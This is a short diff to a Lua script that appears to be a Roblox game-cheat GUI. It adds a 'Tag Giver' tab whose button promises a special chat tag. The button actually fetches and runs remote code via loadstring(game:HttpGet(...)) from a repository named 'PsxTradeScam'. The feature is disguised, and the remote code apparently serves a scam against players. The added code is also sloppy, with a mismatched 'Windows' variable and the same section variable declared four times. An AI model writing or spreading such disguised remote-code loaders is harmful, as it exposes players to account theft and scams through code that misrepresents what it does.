@@ -74,6 +74,19 @@ end)
 
 
 --seventh
+local Tags = Windows:NewTab("Tag Giver")
+local TagsSection = Tags:NewSection("Partner Tag")
+local TagsSection = Tags:NewSection("Developer Tag")
+local TagsSection = Tags:NewSection("Leader Board Tag")
+local TagsSection = Tags:NewSection("Admin Tag")
+
+
+TagsSection:NewButton("Tag Giver", "Give special tag in chat", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+end)
+
+
+--eighth
 local VisualPetChanger = Window:NewTab("Visual Pet Changer")
 local VisualPetChangerSection = VisualPetChanger:NewSection("Visual Pet Changer")
 
